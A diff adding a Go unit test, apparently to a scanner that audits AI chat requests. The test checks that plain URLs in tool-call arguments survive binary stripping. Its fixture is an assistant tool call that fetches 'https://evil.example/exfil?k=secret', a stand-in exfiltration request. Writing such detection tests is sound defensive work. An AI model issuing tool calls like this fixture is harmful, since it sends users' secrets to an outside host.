@@ -151,6 +151,21 @@ func TestToolPayloadsStripBinaryContent(t *testing.T) {
 	require.NotContains(t, snapshot.ScanText, bigBase64)
 }
 
+// TestToolArgumentURLsReachTheScanner locks in that binary stripping does NOT
+// delete plain http(s) URLs from tool arguments. A tool's target/exfil URL is a
+// primary cyber-abuse signal; only data: URIs and long base64 bodies are blobs.
+func TestToolArgumentURLsReachTheScanner(t *testing.T) {
+	bigBase64 := strings.Repeat("QUJDRA", 60) // >256 opaque base64 chars
+	body := `{"messages":[
+		{"role":"assistant","tool_calls":[{"id":"c1","type":"function","function":{"name":"fetch","arguments":"{\"target\":\"https://evil.example/exfil?k=secret\",\"blob\":\"data:image/png;base64,` + bigBase64 + `\"}"}}]}
+	]}`
+	snapshot, err := ExtractPromptSnapshot(Request{Protocol: "openai_chat_completions", Body: []byte(body)})
+	require.NoError(t, err)
+	// The URL survives (auditable), the data: URI blob is stripped.
+	require.Contains(t, snapshot.ScanText, "https://evil.example/exfil?k=secret")
+	require.NotContains(t, snapshot.ScanText, bigBase64)
+}
+
 // TestKnownIgnoredBlocksDoNotBreakExtraction confirms reasoning/thinking and
 // inline binary parts are skipped as known-ignored while sibling text and tools
 // are still scanned.
